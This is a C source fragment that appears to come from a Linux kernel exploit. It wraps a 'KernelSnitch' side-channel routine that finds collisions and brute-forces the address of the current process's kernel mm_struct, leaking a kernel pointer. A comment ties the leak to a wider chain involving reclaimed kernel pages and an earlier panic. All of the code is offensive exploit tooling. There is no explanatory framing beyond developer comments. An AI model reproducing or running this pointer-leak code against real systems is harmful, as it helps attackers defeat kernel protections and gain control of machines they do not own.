void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

uintptr_t leak_current_mm_struct(void) {
  /* Collision discovery and brute force must run in this process. A leak
   * produced by clone_leak_child() identifies the disposable child's mm,
   * which is freed and reclaimed by prepare_kernel_page(). Keeping that stale
   * address in boot_id.data was the source of the task_frag/put_page panic. */
  setup_kernelsnitch();
  kernelsnitch_find_collisions(ks);
  if (!kernelsnitch_collisions_ready()) {
    pr_warning("live-mm KernelSnitch collision finding failed\n");
    cleanup_kernelsnitch();
    return 0;
  }

  run_kernelsnitch_bruteforce();
  uintptr_t mm = current_kernelsnitch_mm_struct();
  cleanup_kernelsnitch();
  if (mm == (uintptr_t)-1 || !is_direct_ptr(mm)) {
    pr_warning("live-mm KernelSnitch returned invalid mm=%016zx\n", mm);
    return 0;
  }
  pr_success("live-mm KernelSnitch mm=%016zx pid=%d\n", mm, getpid());
  return mm;
}

